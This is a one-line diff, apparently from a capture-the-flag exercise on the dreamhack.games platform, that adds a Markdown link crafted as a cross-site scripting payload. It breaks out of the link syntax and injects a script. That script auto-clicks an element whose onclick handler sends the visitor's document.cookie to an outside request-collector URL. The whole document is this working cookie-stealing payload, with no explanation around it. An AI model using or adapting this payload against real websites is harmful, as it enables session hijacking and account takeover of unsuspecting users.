@@ -1,0 +1,1 @@
+[/a><script>chk.click()</script>](#' id='chk' onclick='location.href="https://vrsnegj.request.dreamhack.games/cookie=" + document.cookie')
